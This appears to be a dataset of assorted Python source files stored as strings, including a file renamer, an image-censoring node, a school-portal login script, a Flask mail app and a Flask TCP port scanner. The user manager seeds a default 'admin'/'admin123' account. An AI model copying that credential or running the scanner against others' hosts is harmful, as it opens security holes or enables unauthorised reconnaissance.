    \r\n        files_renamed = 0\r\n        mapping_entries = []\r\n        \r\n        for i, file in enumerate(files):\r\n            old_path = os.path.join(directory, file)\r\n            extension = file.split('.')[-1] if '.' in file else ''\r\n            new_filename = f\"{prefix}{start_number + i}.{extension}\"\r\n            new_path = os.path.join(directory, new_filename)\r\n            \r\n            os.rename(old_path, new_path)\r\n            mapping_entries.append(f\"{new_filename} -> {file}\\n\")\r\n            \r\n            print(f\"Renamed: {file} -> {new_filename}\")\r\n            log_action(f\"Renamed: {file} -> {new_filename}\")\r\n            \r\n            files_renamed += 1\r\n        \r\n        # Guardar el mapeo para rollback\r\n        if files_renamed > 0:\r\n            with open(MAPPING_FILE, \"w\") as backup:\r\n                backup.writelines(mapping_entries)\r\n            print(f\"Renaming completed. Total files renamed: {files_renamed}.\")\r\n            log_action(f\"Renaming completed. Total files renamed: {files_renamed}.\")\r\n        else:\r\n            print(\"No files were renamed.\")\r\n            log_action(\"No files were renamed.\")\r\n    \r\n    except Exception as e:\r\n        print(f\"Error: {e}\")\r\n        log_action(f\"Renamed error: {e}\")\r\n\r\n\r\n\r\n\r\n\r\ndef rename_files(directory, prefix, current_start, current_end, new_start):\r\n    try:\r\n    \r\n        check_write_permissions(directory)\r\n        # Listar los archivos en la carpeta\r\n        files = sorted(os.listdir(directory))\r\n        \r\n        # Validar si la carpeta est\u00e1 vac\u00eda\r\n        if not files:\r\n            print(f\"Warning: The directory '{directory}' is empty.\")\r\n            sys.exit(1)\r\n        \r\n        # Filtrar archivos con o sin prefijo\r\n        current_files = [f for f in files if \r\n                 (prefix and f.startswith(prefix) and current_start <= int(f[len(prefix):].split('.')[0]) <= current_end) or\r\n                 (not prefix and f.split('.')[0].isdigit() and current_start <= int(f.split('.')[0]) <= current_end)]\r\n        \r\n        log_action(\"Command: \" + ' '.join(sys.argv))\r\n        \r\n        # Detectar archivos faltantes en el rango\r\n        missing_files = [f\"{prefix or ''}{i}\" for i in range(current_start, current_end + 1) \r\n                         if not any(f.startswith(f\"{prefix or ''}{i}.\") for f in files)]\r\n\r\n        # Si faltan archivos, advertir al usuario\r\n        if missing_files:\r\n            print(f\"Warning: The following files are missing: {', '.join(missing_files)}\")\r\n            log_action(f\"Warning: The following files are missing: {', '.join(missing_files)}\")\r\n            confirm = input(\"Do you want to continue renaming the available files? (Y/N): \")\r\n            log_action(f\"User selected: {confirm}\")  # Registrar respuesta del usuario\r\n\r\n            if confirm.lower() != 'y':\r\n                print(\"Operation cancelled.\")\r\n                log_action(\"Operation cancelled by user.\")\r\n                sys.exit(1)\r\n\r\n        # Ordenar los archivos por su n\u00famero actual\r\n        current_files.sort(key=lambda x: int(x[len(prefix or ''):].split('.')[0]))\r\n\r\n\r\n        # Verificar si hay suficientes archivos para renombrar\r\n        if len(current_files) != (current_end - current_start + 1):\r\n            print(\"Warning: The current range does not match the number of available files.\")\r\n            log_action(\"Warning: The current",
    "import math\nimport os\nimport cv2\nimport numpy as np\nimport torch\n\nimport folder_paths\nfrom .utils import ModelLoader, overlay, pixelate\n\nif \"Nudenet\" not in folder_paths.folder_names_and_paths:\n    current_paths = [os.path.join(folder_paths.models_dir, \"Nudenet\")]\nelse:\n    current_paths, _ = folder_paths.folder_names_and_paths[\"Nudenet\"]\nfolder_paths.supported_pt_extensions.update({\".onnx\"})\nfolder_paths.folder_names_and_paths[\"Nudenet\"] = (\n    current_paths,\n    folder_paths.supported_pt_extensions,\n)\n\nCENSOR_METHODS = [\n    \"pixelate\",\n    \"blur\",\n    \"gaussian_blur\",\n    \"image\",\n]\n\nCLASSIDS_LABELS_MAPPING = {\n    0: \"FEMALE_GENITALIA_COVERED\",\n    1: \"FACE_FEMALE\",\n    2: \"BUTTOCKS_EXPOSED\",\n    3: \"FEMALE_BREAST_EXPOSED\",\n    4: \"FEMALE_GENITALIA_EXPOSED\",\n    5: \"MALE_BREAST_EXPOSED\",\n    6: \"ANUS_EXPOSED\",\n    7: \"FEET_EXPOSED\",\n    8: \"BELLY_COVERED\",\n    9: \"FEET_COVERED\",\n    10: \"ARMPITS_COVERED\",\n    11: \"ARMPITS_EXPOSED\",\n    12: \"FACE_MALE\",\n    13: \"BELLY_EXPOSED\",\n    14: \"MALE_GENITALIA_EXPOSED\",\n    15: \"ANUS_COVERED\",\n    16: \"FEMALE_BREAST_COVERED\",\n    17: \"BUTTOCKS_COVERED\",\n}\n\nLABELS_CLASSIDS_MAPPING = labels_classids_mapping = {\n    label: class_id for class_id, label in CLASSIDS_LABELS_MAPPING.items()\n}\n\n\ndef read_image(img, target_size=320):\n    assert isinstance(img, np.ndarray)\n\n    img_height, img_width = img.shape[:2]\n    img = cv2.cvtColor(img, cv2.COLOR_BGR2RGB)\n    aspect = img_width / img_height\n\n    if img_height > img_width:\n        new_height = target_size\n        new_width = int(round(target_size * aspect))\n    else:\n        new_width = target_size\n        new_height = int(round(target_size / aspect))\n\n    resize_factor = math.sqrt(\n        (img_width**2 + img_height**2) / (new_width**2 + new_height**2)\n    )\n    img = cv2.resize(img, (new_width, new_height))\n\n    pad_x = target_size - new_width\n    pad_y = target_size - new_height\n    pad_top = pad_y // 2\n    pad_bottom = pad_y - pad_top\n    pad_left = pad_x // 2\n    pad_right = pad_x - pad_left\n\n    img = cv2.copyMakeBorder(\n        img,\n        pad_top,\n        pad_bottom,\n        pad_left,\n        pad_right,\n        cv2.BORDER_CONSTANT,\n        value=[0, 0, 0],\n    )\n    img = cv2.resize(img, (target_size, target_size))\n\n    image_data = img.astype(\"float32\")\n    image_data = np.transpose(img, (2, 0, 1))\n    image_data = np.expand_dims(image_data, axis=0)\n    return image_data, resize_factor, pad_left, pad_top\n\n\ndef postprocess(output, resize_factor, pad_left, pad_top, min_score):\n    outputs = np.transpose(np.squeeze(output[0]))\n    rows = outputs.shape[0]\n    boxes = []\n    scores = []\n    class_ids = []\n    for i in range(rows):\n        classes_scores = outputs[i][4:]\n        max_score = np.amax(classes_scores)\n        if max_score >= min_score:\n            class_id = np.argmax(classes_scores)\n            x, y, w, h = outputs[i][0], outputs[i][1], outputs[i][2], outputs[i][3]\n            left = int(round((x - w * 0.5 - pad_left) * resize_factor))\n            top = int(round((y - h * 0.5 - pad_top) * resize_factor))\n            width = int(round(w * resize_factor))\n            height = int(round(h * resize_factor))\n            class_ids.append(class_id)\n            scores.append(max_score)\n            boxes.append([left, top, width, height])\n    indices = cv2.dnn.NMSBoxes(boxes, scores, 0.25, 0.45)\n    res = []\n    for i in indices:\n        box = boxes[i]\n        score = scores[i]\n        class_id = class_ids[i]\n        res.append(\n            {\n                \"id\": class_id,\n                \"score\": round(float(score), 2),\n                \"box\": box,\n            }\n        )\n    return res\n\n\ndef nudenet_execute(\n    nudenet_model: ModelLoader,\n    input_image: torch.Tensor,\n    censor_method: str,\n    filtered_labels: list,\n    min_score: float,\n    blocks: float,\n    overlay_image: torch.Tensor,\n    overlay_strength: float,\n):\n    image = input_image.clone()\n    if isinstance(image, torch.Tensor):\n        if image.dim() == 4:\n            image = image[0]\n        image = image.cpu().numpy()\n\n    preprocessed_image, resize_factor, pad_left, pad_top = read_image(\n        image, nudenet_model[\"input_width\"]\n    )\n    outputs = nudenet_model[\"session\"].run(\n        None, {nudenet_model[\"input_name\"]: preprocessed_image}\n    )\n    detections = postprocess(outputs, resize_factor, pad_left, pad_top, min_score)\n    censored = [d for d in detections if d.get(\"id\") not in filtered_labels]\n    for d in censored:\n        box = d[\"box\"]\n        x, y, w, h = box[0], box[1], box[2], box[3]\n        area = image[y : y + h, x : x + w]\n        if censor_method == \"pixelate\":\n            image[y : y + h, x : x + w] = pixelate(area, blocks=blocks)\n        elif censor_method == \"blur\":\n            image[y : y + h, x : x + w] = cv2.blur(area, (blocks, blocks))\n        elif censor_method == \"gaussian_blur\":\n            image[y : y + h, x : x + w] = cv2.GaussianBlur(area, (h, h), 0)\n        elif censor_method == \"image\":\n            if",
    "from typing import Dict, Any\n\nclass DiscordConfig:\n    \"\"\"Discord Bot Configuration for ONIO\"\"\"\n    \n    # Bot Configuration\n    BOT_TOKEN = \"your_discord_bot_token\"\n    APPLICATION_ID = \"your_application_id\"\n    PUBLIC_KEY = \"your_public_key\"\n    \n    # Server Settings\n    ALLOWED_SERVERS = []  # Empty list means all servers are allowed\n    DEFAULT_PREFIX = \"!\"\n    \n    # Permission Configuration\n    PERMISSIONS = {\n        \"send_messages\": True,\n        \"read_messages\": True,\n        \"embed_links\": True,\n        \"attach_files\": True,\n        \"read_message_history\": True,\n        \"mention_everyone\": False,\n        \"use_external_emojis\": True,\n        \"add_reactions\": True\n    }\n    \n    # Command Settings\n    COMMANDS = {\n        \"help\": {\n            \"enabled\": True,\n            \"description\": \"Show help message\",\n            \"category\": \"General\"\n        },\n        \"status\": {\n            \"enabled\": True,\n            \"description\": \"Check bot status\",\n            \"category\": \"System\"\n        },\n        \"chat\": {\n            \"enabled\": True,\n            \"description\": \"Chat with the AI\",\n            \"category\": \"AI\"\n        }\n    }\n    \n    # Channel Configuration\n    CHANNEL_CONFIG = {\n        \"allowed_types\": [\"text\", \"news\", \"forum\"],\n        \"log_channel\": None,\n        \"welcome_channel\": None,\n        \"admin_channel\": None\n    }\n    \n    # Message Settings\n    MESSAGE_CONFIG = {\n        \"max_length\": 2000,\n        \"delete_command_after\": False,\n        \"use_embeds\": True,\n        \"default_color\": 0x3498db\n    }\n\n    @classmethod\n    def get_config(cls) -> Dict[str, Any]:\n        \"\"\"Get all Discord configuration as dictionary\"\"\"\n        return {\n            key: value for key, value in cls.__dict__.items()\n            if not key.startswith('_') and isinstance(value, (dict, str, int, float, bool, list))\n        } ",
    "import requests\r\nimport json\r\n\r\nname = \"\"\r\npswd = \"\"\r\nFirsttoken = \"\"\r\n\r\ndef ConnectToEd(username, password):\r\n    global name, pswd, Firsttoken\r\n    name, pswd = username, password\r\n    headersConnection={\r\n        \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36\",\r\n    }\r\n    DataConnection={\r\n        \"identifiant\":username,\r\n        \"motdepasse\": password,\r\n        \"isReLogin\": False,\r\n        \"uuid\":\"\",\r\n        \"fa\":[],\r\n    }\r\n    r= requests.post(\"https://api.ecoledirecte.com/v3/login.awp\", data={\"data\": json.dumps(DataConnection)}, headers=headersConnection)\r\n    data =r.json()\r\n    headers2={\r\n        \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36\",\r\n        \"X-Token\": data[\"token\"]\r\n    }\r\n    QueryString1={\r\n        \"verbe\":\"get\",\r\n        \"v\":\"4.57.1\",\r\n    }\r\n    dataConnection2={}\r\n    r2 = requests.post(\"https://api.ecoledirecte.com/v3/connexion/doubleauth.awp\", data={\"data\": json.dumps(dataConnection2)}, headers=headers2, params=QueryString1)\r\n    data2=r2.json()\r\n    Firsttoken = r2.headers[\"X-Token\"]\r\n    return data2[\"data\"]\r\n\r\ndef ConnectToEdPart2(answer):\r\r\n    dataConnection3={\r\n        \"choix\" : answer.decode(),\r\n    }\r\n    queryString3={\r\n       \"verbe\" : \"post\",\r\n    }\r\n    Headers3={\r\n        \"X-Token\" : Firsttoken,\r\n        \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36\",\r\n    }\r\n    r3 = requests.post(\"https://api.ecoledirecte.com/v3/connexion/doubleauth.awp\", data={\"data\": json.dumps(dataConnection3)}, headers=Headers3, params=queryString3)\r\n    data3 = r3.json()\r\n    dataConnection4={\r\n        \"identifiant\":name,\r\n        \"motdepasse\": pswd,\r\n        \"isReLogin\": False,\r\n        \"uuid\":\"\",\r\n        \"fa\":[{\r\n            \"cn\":data3[\"data\"][\"cn\"],\r\n            \"cv\":data3[\"data\"][\"cv\"],\r\n        }]\r\n    }\r\n    Headers4={\r\n        \"X-Token\":r3.headers[\"X-Token\"],\r\n        \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36\",\r\n    }\r\n    r4 = requests.post(\"https://api.ecoledirecte.com/v3/login.awp\", data={\"data\": json.dumps(dataConnection4)}, headers=Headers4)\r\n    return r4.headers[\"X-Token\"]\r\n\r\n\r\ndef AskForNotes(Token):\r\n    dataNotesRequest={\r\n      \"anneeScolaire\": \"\",\r\n    }\r\n    headersNoteRequest={\r\n        \"X-Token\" : Token,\r\n        \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36\",\r\n    }\r\n    queryStringNoteRequest={\r\n        \"verbe\" : \"get\",\r\n    }\r\n    notesRequest = requests.post(\"https://api.ecoledirecte.com/v3/eleves/xxxx/notes.awp\", data={\"data\": json.dumps(dataNotesRequest)}, headers=headersNoteRequest, params=queryStringNoteRequest)\r\n    dataNotes = notesRequest.json()\r\n    return dataNotes[\"data\"]\r\n",
    "#FUNCTION IN PYTHON\n#BLOCK OF STATEMENT THAT PERFORMS A SPECIFIC TASK\n#REPEAT = REDUNDANT AVOID WRITING SAME CODE \n#ALWAYS PREFER FUNCTION FOR REDUNDANT THINGS\n\n# def calc_sum(a, b): #defining function \n#     sum = a + b #what is the purpose of the variables in function ?\n#     print(sum) #printing sum\n#     return sum #shows output\n    \n# calc_sum(2, 4) #calling function\n# calc_sum(4, 1)\n# calc_sum(4, 7)\n\n#-------------------------------------------------------------------------------------------------------------------------------------------------\n# #function definition\n# def calc_sum(a, b): # a & b in the function are called parameters\n#     return a+ b\n\n# print(calc_sum(1, 2)) #function calling and values are called arguments\n\n#-------------------------------------------------------------------------------------------------------------------------------------------------\n# #No Parameters and Arguments function \n# def print_hello():\n#     print(\"Hello World\")\n\n# print_hello()\n\n#-------------------------------------------------------------------------------------------------------------------------------------------------\n#Average finding function\n\n# def calc_avg(a, b, c):\n#     sum = a + b + c\n#     avg = sum / 3\n#     return avg\n# print(calc_avg(1,3,4))\n\n#-------------------------------------------------------------------------------------------------------------------------------------------------\n#FUNCTION ARE OF TWO TYPE \n#BUILT-IN :- print() , len(), type(), range()\n#USER-DEFINED :- WHICH WILL BE WRITTEN BY PROGRAMMERS\n\n#-------------------------------------------------------------------------------------------------------------------------------------------------\n#DEFAULT PARAMETERS\n\n# def calc_prod(a = 3, b = 4): #single value can also be defined to parameters always first values must be user given value\n#     print(a * b)\n#     return(a * b)\n\n# calc_prod()\n# #-------------------------------------------------------------------------------------------------------------------------------------------------\n#QUIZ   \n#WRITE A PYTHON PROGRAMM TO PRINT THE LENGTH OF A LIST ( LIST IS PARAMETER)\n\n# city = [\"Navi-Mumbai\", \"Delhi\", \"Pune\"]    \n# heroes = [\"Ironman\", \"Thor\", \"Spiderman\"]\n\n# def print_len(list):\n#     print(len(list))\n\n# print_len(city)\n# print_len(heroes)\n\n# def print_list(list):\n#     for item in list:\n#         print(item, end = \" \")\n        \n# print_list(heroes)\n# print_list(city)\n# print()\n#-------------------------------------------------------------------------------------------------------------------------------------------------\n#WRITE A PYTHON PROGRAM TO FIND THE FACTORIAL OF N \n# def fact(n):\n#     fact = 1\n#     for i in range(1, n+1):\n#         fact *= i\n#         print(fact)\n        \n# fact(8)\n\n#-------------------------------------------------------------------------------------------------------------------------------------------------\n#WRITE A PYTHON PROGRAMM TO CONVERT USD TO INR\n# def converter(usd_val):\n#     inr_val = usd_val * 83\n#     print(\"USD =\", usd_val, \"INR =\", inr_val)\n\n# converter(20)\n\n#-------------------------------------------------------------------------------------------------------------------------------------------------\n#WRITE A FUNCTION TO IDENTIFY WHETER THE NUMBER IS EVEN OR ODD\n# def num(a, b):\n    \n#     if(a%b == 0 ):\n#         print(\"EVEN\")\n#     else:\n#         print(\"ODD\")\n\n# num(4, 2)\n#-------------------------------------------------------------------------------------------------------------------------------------------------\n\n#RECURSION\n#WHEN A FUNCTION CALLS ITSELF REPEATEDLY\n\n# def show(n):\n#     if(n == 0):\n#         return #Base case\n#     print(n)\n#     show(n-1)\n#     print(\"end\")\n# show(6)\n# #-------------------------------------------------------------------------------------------------------------------------------------------------\n\n# # #RECURENSE RELATION\n# def fact(n):\n#     if(n == 1 or n == 0):\n#         return 1\n#     else:\n#         return n * fact(n -1)\n    \n# print(fact(7))\n\n# #-------------------------------------------------------------------------------------------------------------------------------------------------\n# #QUIZ\n# #WRITE A PYTHON RECURSIVE FUNCTION TO CALCULATE THE SUM OF FIRST N NATURAL NUMBERS\n# def calc_num(n):\n#     if(n == 0):\n#         return 0\n#     return calc_num(n - 1) + n\n\n# print(calc_num(8))\n\n#-------------------------------------------------------------------------------------------------------------------------------------------------\n",
    "import bcrypt\nfrom loguru import logger\nimport os\nimport json\n\nclass UserManager:\n    def __init__(self, users_file='users.json'):\n        \"\"\"\n        \u521d\u59cb\u5316\u7528\u6237\u7ba1\u7406\u5668\n        \n        :param users_file: \u5b58\u50a8\u7528\u6237\u4fe1\u606f\u7684\u6587\u4ef6\n        \"\"\"\n        self.users_file = users_file\n        self.users = self.load_users()\n    \n    def load_users(self):\n        \"\"\"\n        \u52a0\u8f7d\u7528\u6237\u4fe1\u606f\n        \n        :return: \u7528\u6237\u5b57\u5178\n        \"\"\"\n        try:\n            if not os.path.exists(self.users_file):\n                # \u5982\u679c\u6587\u4ef6\u4e0d\u5b58\u5728\uff0c\u521b\u5efa\u9ed8\u8ba4\u7ba1\u7406\u5458\u8d26\u53f7\n                default_users = {\n                    'admin': self.hash_password('admin123')\n                }\n                with open(self.users_file, 'w') as f:\n                    json.dump(default_users, f)\n                return default_users\n            \n            with open(self.users_file, 'r') as f:\n                return json.load(f)\n        except Exception as e:\n            logger.error(f\"\u52a0\u8f7d\u7528\u6237\u4fe1\u606f\u5931\u8d25: {e}\")\n            return {}\n    \n    def hash_password(self, password):\n        \"\"\"\n        \u5bc6\u7801\u54c8\u5e0c\n        \n        :param password: \u660e\u6587\u5bc6\u7801\n        :return: \u54c8\u5e0c\u540e\u7684\u5bc6\u7801\n        \"\"\"\n        return bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt()).decode('utf-8')\n    \n    def verify_password(self, stored_password, provided_password):\n        \"\"\"\n        \u9a8c\u8bc1\u5bc6\u7801\n        \n        :param stored_password: \u5b58\u50a8\u7684\u54c8\u5e0c\u5bc6\u7801\n        :param provided_password: \u63d0\u4f9b\u7684\u660e\u6587\u5bc6\u7801\n        :return: \u662f\u5426\u5339\u914d\n        \"\"\"\n        return bcrypt.checkpw(\n            provided_password.encode('utf-8'), \n            stored_password.encode('utf-8')\n        )\n    \n    def authenticate(self, username, password):\n        \"\"\"\n        \u7528\u6237\u8ba4\u8bc1\n        \n        :param username: \u7528\u6237\u540d\n        :param password: \u5bc6\u7801\n        :return: \u662f\u5426\u8ba4\u8bc1\u6210\u529f\n        \"\"\"\n        try:\n            if username not in self.users:\n                return False\n            \n            return self.verify_password(self.users[username], password)\n        except Exception as e:\n            logger.error(f\"\u8ba4\u8bc1\u5931\u8d25: {e}\")\n            return False\n    \n    def add_user(self, username, password):\n        \"\"\"\n        \u6dfb\u52a0\u65b0\u7528\u6237\n        \n        :param username: \u7528\u6237\u540d\n        :param password: \u5bc6\u7801\n        :return: \u662f\u5426\u6dfb\u52a0\u6210\u529f\n        \"\"\"\n        try:\n            if username in self.users:\n                return False\n            \n            self.users[username] = self.hash_password(password)\n            \n            with open(self.users_file, 'w') as f:\n                json.dump(self.users, f)\n            \n            return True\n        except Exception as e:\n            logger.error(f\"\u6dfb\u52a0\u7528\u6237\u5931\u8d25: {e}\")\n            return False\n",
    "import sqlite3\r\nimport os.path  # to use absolute path when connecting the database\r\n\r\nfrom flask import Flask, redirect, render_template, request, session \r\nfrom flask_session import Session  # for cookies\r\nfrom werkzeug.security import check_password_hash, generate_password_hash  # To encrypt the passwords\r\n\r\nfrom helpers import apology, login_required, get_date, get_time, validate_email, verified_user_required, user_email_required\r\n\r\n\r\n# Configure application\r\napp = Flask(__name__)\r\n\r\n# Code snippet taken from problem set 9 - finance - (CS50X 2024)\r\n# Configure session to use filesystem (instead of signed cookies)\r\napp.config[\"SESSION_PERMANENT\"] = False\r\napp.config[\"SESSION_TYPE\"] = \"filesystem\"\r\nSession(app)\r\n\r\n# Connecting the database\r\nBASE_DIR = os.path.dirname(os.path.abspath(__file__))\r\n\r\n# creating absolute path\r\ndb_path = os.path.join(BASE_DIR, \"Database/beemail.db\")\r\ndb = sqlite3.connect(db_path, check_same_thread=False)\r\ncur = db.cursor()  # cursor\r\n\r\nVERIFICATION_QUESTIONS = {  \r\n    \"pet\": \"What is your first pet's name?\",\r\n    \"school\": \"What is your first school's name?\",\r\n    \"friend\": \"What is your best friend's name?\",\r\n    # make sure the keys are lowercase\r\n}\r\n\r\n\r\ndef search_database(target_row, table, search_column, column_unique_val):\r\n    \"\"\"\r\n    Search for a specific item in the database.\r\n\r\n    Executes a query to retrieve the value of a target row\r\n    from a specified table where the search column matches\r\n    the given unique value. Returns the value if found; otherwise, None.\r\n    \"\"\"\r\n\r\n    cur.execute(f\"SELECT {target_row} FROM {table} WHERE {search_column}=?\", (column_unique_val,))\r\n    data = cur.fetchone()\r\n\r\n    if data:\r\n        return data[0]\r\n    return data\r\n\r\n\r\n# Code snippet taken from problem set 9 - finance - (CS50X 2024)\r\n@app.after_request\r\ndef after_request(response):\r\n    \"\"\"Ensure responses aren't cached\"\"\"\r\n    response.headers[\"Cache-Control\"] = \"no-cache, no-store, must-revalidate\"\r\n    response.headers[\"Expires\"] = 0\r\n    response.headers[\"Pragma\"] = \"no-cache\"\r\n    return response\r\n\r\n\r\n@app.route(\"/\")\r\n@login_required  \r\ndef index():\r\n    \"\"\"\r\n    Render the homepage with user details and message counts.\r\n\r\n    Checks the number of unread 'primary' and 'reply' messages for the logged-in user.\r\n    Displays the user's name, email, and counts of new primary mails and responses.\r\n    \"\"\"\r\n    name = session[\"user_name\"]\r\n    email = session[\"user_email\"]\r\n\r\n    # Define the query template\r\n    new_mail_query = \"\"\"\r\n        SELECT COUNT(id) \r\n        FROM message_details \r\n        JOIN user_messages ON id = message_id \r\n        WHERE type = 'primary' \r\n        AND status = 0 \r\n        AND recipient_email = ?\r\n    \"\"\"\r\n\r\n    new_response_query = \"\"\"\r\n        SELECT COUNT(id) \r\n        FROM message_details \r\n        JOIN user_messages ON id = message_id \r\n        WHERE type = 'reply' \r\n        AND status = 0 \r\n        AND recipient_email = ?\r\n    \"\"\"\r\n\r\n    # Execute the queries and fetch the results\r\n    cur.execute(new_mail_query, (email,))\r\n    new_mails_num = cur.fetchone()[0]  # Get the count value\r\n\r\n    cur.execute(new_response_query, (email,))\r\n    new_responses_num = cur.fetchone()[0]  # Get the count value\r\n\r\n    return render_template(\"index.html\", name=name, new_mails_num=new_mails_num, new_responses_num=new_responses_num)\r\n\r\n\r\n@app.route(\"/logout\")\r\ndef logout():\r\n    \"\"\"Log user out\"\"\"\r\n\r\n    # Forget any info about the user\r\n    session.clear()\r\n\r\n    # Redirect user to login form\r\n    return redirect(\"/login\")\r\n\r\n\r\n@app.route(\"/login\", methods=[\"GET\", \"POST\"])\r\ndef login():\r\n    \"\"\"\r\n    Handles user login with validation.\r\n\r\n    On GET, clears the session and renders the login page. On POST, validates the email, \r\n    password, and verifies the credentials. If successful, stores user data in the \r\n    session and redirects to the homepage.\r\n    \"\"\"\r\n\r\n    if request.method == \"GET\":\r\n        session.clear()\r\n        return render_template(\"login.html\")\r\n    else:  # POST\r\n        entered_email = request.form.get(\"email\")\r\n        entered_password = request.form.get(\"password\")\r\n\r\n        # Testing input values\r\n        if not entered_email:\r\n            return apology(\"Oops! You forgot to enter your email.\")\r\n        elif not entered_password:\r\n            apology(\"Oops! You forgot to enter your password.\")\r\n        elif not validate_email(entered_email):\r\n            return apology(\"Oops! Invalid email. Ensure it includes a username, the domain '@beemail.hive', \" + \r\n                           \"starts with a letter, and only uses periods, underscores, or hyphens as special characters.\")\r\n        elif not 8 <= len(entered_password.strip()) <= 16:\r\n            return apology(\"Oops! The password you entered is invalid, \" +\r\n                            \"Please ensure that it is between 8 and 16 characters in length.\")\r\n        else:\r\n            entered_password = entered_password.strip()\r\n            entered_email = entered_email.lower().stri",
    "import io\nimport logging\nimport wave\nfrom ..models import STSResponse\nfrom . import ResponseHandlerWithQueue\n\nlogger = logging.getLogger(__name__)\n\n\nclass PlayWaveResponseHandler(ResponseHandlerWithQueue):\n    def __init__(self, debug: bool = False):\n        super().__init__()\n        self.debug = debug\n        self.p = None\n\n        try:\n            import pyaudio\n\n            self.to_wave = None\n            self.p = pyaudio.PyAudio()\n            self.play_stream = None\n            self.wave_params = None\n            self.chunk_size = 1024\n\n        except Exception as ex:\n            logger.warning(f\"Error at __init__ in PlayWaveResponseHandler: {ex}\")\n            logger.warning(\"Response handler will just print responses.\")\n\n    def play_audio(self, content: bytes):\n        try:\n            self.is_playing_locally = True\n\n            if self.to_wave:\n                wave_content = self.to_wave(content)\n            else:\n                wave_content = content\n\n            with wave.open(io.BytesIO(wave_content), \"rb\") as wf:\n                current_params = wf.getparams()\n                if not self.play_stream or self.wave_params != current_params:\n                    self.wave_params = current_params\n                    self.play_stream = self.p.open(\n                        format=self.p.get_format_from_width(self.wave_params.sampwidth),\n                        channels=self.wave_params.nchannels,\n                        rate=self.wave_params.framerate,\n                        output=True,\n                    )\n\n                data = wf.readframes(self.chunk_size)\n                while True:\n                    data = wf.readframes(self.chunk_size)\n                    if not data:\n                        break\n                    self.play_stream.write(data)\n\n        finally:\n            self.is_playing_locally = False\n\n    async def process_response_item(self, response: STSResponse):\n        if response.type == \"chunk\":\n            if self.p:\n                # Voice mode\n                if response.audio_data:\n                    self.play_audio(response.audio_data)\n            else:\n                # Text mode\n                if response.type == \"chunk\":\n                    print(f\"AI: {response.text}\")\n                elif response.type == \"final\":\n                    print(f\"context_id={response.context_id}, type={response.type}, audio_data={len(response.audio_data or [])}bytes\")\n",
    "from flask import Flask, render_template, request\nimport socket\nfrom concurrent.futures import ThreadPoolExecutor\n\napp = Flask(__name__)\n\ndef scan_port(target_ip, port):\n    \"\"\"\n    Scans a single port to check if it's open.\n    Args:\n        target_ip (str): The IP address of the target machine.\n        port (int): The port to scan.\n    \n    Returns:\n        str: Result indicating if the port is 'Open' or 'Closed'.\n    \"\"\"\n    try:\n        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n            s.settimeout(0.5)  # Set timeout for faster scanning\n            result = s.connect_ex((target_ip, port))\n            if result == 0:\n                return f\"Port {port}: Open\"\n    except Exception:\n        pass\n    return f\"Port {port}: Closed\"\n\ndef port_scanner(target_ip, start_port, end_port, max_threads=50):\n    \"\"\"\n    Manages scanning for a range of ports using multithreading.\n    Args:\n        target_ip (str): The IP address of the target machine.\n        start_port (int): The starting port.\n        end_port (int): The ending port.\n        max_threads (int): The maximum number of threads to use (default is 50).\n    \"\"\"\n    open_ports = []\n\n    with ThreadPoolExecutor(max_threads) as executor:\n        futures = [executor.submit(scan_port, target_ip, port) for port in range(start_port, end_port + 1)]\n        for future in futures:\n            result = future.result()\n            if \"Open\" in result:\n                open_ports.append(result)\n\n    return open_ports\n\n@app.route(\"/\", methods=[\"GET\", \"POST\"])\ndef index():\n    if request.method == \"POST\":\n        target_ip = request.form.get(\"target_ip\")\n        port = request.form.get(\"port\")\n\n        if target_ip:\n            # If port is not provided, scan a range of ports (e.g., 1-1065535)\n            if not port:\n                start_port = 1\n                end_port = 1000 \n                # 65535\n                results = port_scanner(target_ip, start_port, end_port)\n                return render_template(\"index.html\", result=results, target_ip=target_ip, port=None)\n            else:\n                # If port is provided, scan only the specified port\n                port = int(port)\n                result = scan_port(target_ip, port)\n                return render_template(\"index.html\", result=[result], target_ip=target_ip, port=port)\n\n    return render_template(\"index.html\", result=None)\n\nif __name__ == \"__main__\":\n    app.run(debug=True)\n",
    "from PIL import Image\nimport math\nimport os\n\ndef hex_to_rgba(hex_color):\n    if hex_color.startswith('#'):\n        hex_color = hex_color.lstrip('#')\n    if len(hex_color) == 6:\n        r, g, b = int(hex_color[0:2], 16), int(hex_color[2:4], 16), int(hex_color[4:6], 16)\n        a = 255\n    elif len(hex_color) == 8:\n        r, g, b, a = int(hex_color[0:2], 16), int(hex_color[2:4], 16), int(hex_color[4:6], 16), int(hex_color[6:8], 16)\n    else:\n        raise ValueError(\"Invalid color format. Use #RRGGBB or #RRGGBBAA instead.\")\n    return (r, g, b, a)\n\ndef generate_gradient(width, height, colors, angle, output_path):\n    image = Image.new(\"RGBA\", (width, height))\n    pixels = image.load()\n\n    colors = [(hex_to_rgba(color), position) for color, position in colors]\n    colors = sorted(colors, key=lambda c: c[1])\n\n    angle_rad = math.radians(angle)\n    dx = math.cos(angle_rad)\n    dy = math.sin(angle_rad)\n\n    diag = math.sqrt(width**2 + height**2)\n\n    for y in range(height):\n        for x in range(width):\n\n            position = ((x * dx + y * dy) / diag)\n\n            position = max(0.0, min(1.0, position))\n\n            for i in range(len(colors) - 1):\n                color_start, pos_start = colors[i]\n                color_end, pos_end = colors[i + 1]\n\n                if pos_start <= position <= pos_end:\n\n                    local_pos = (position - pos_start) / (pos_end - pos_start)\n\n                    r = int(color_start[0] + (color_end[0] - color_start[0]) * local_pos)\n                    g = int(color_start[1] + (color_end[1] - color_start[1]) * local_pos)\n                    b = int(color_start[2] + (color_end[2] - color_start[2]) * local_pos)\n                    a = int(color_start[3] + (color_end[3] - color_start[3]) * local_pos)\n\n                    pixels[x, y] = (r, g, b, 